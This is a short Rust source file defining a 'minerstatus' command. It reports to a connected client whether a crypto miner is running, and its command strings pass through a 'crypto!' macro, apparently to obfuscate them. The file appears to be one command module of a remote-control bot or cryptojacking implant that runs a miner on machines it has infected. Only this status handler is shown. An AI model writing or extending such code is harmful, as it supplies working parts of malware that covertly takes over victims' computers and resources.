use super::prelude::*;

pub struct MinerLog;

#[async_trait]
impl Command for MinerLog {
    fn name(&self) -> String {
        crypto!("minerstatus")
    }

    fn help(&self) -> String {
        crypto!("Get status about crypto miner")
    }

    fn min_args(&self) -> usize {
        0
    }

    async fn execute(&self, client: &mut Client, _args: Vec<&str>) -> anyhow::Result<()> {
        client.send(ok(format!("{}", crypto::is_runned())))
    }
}
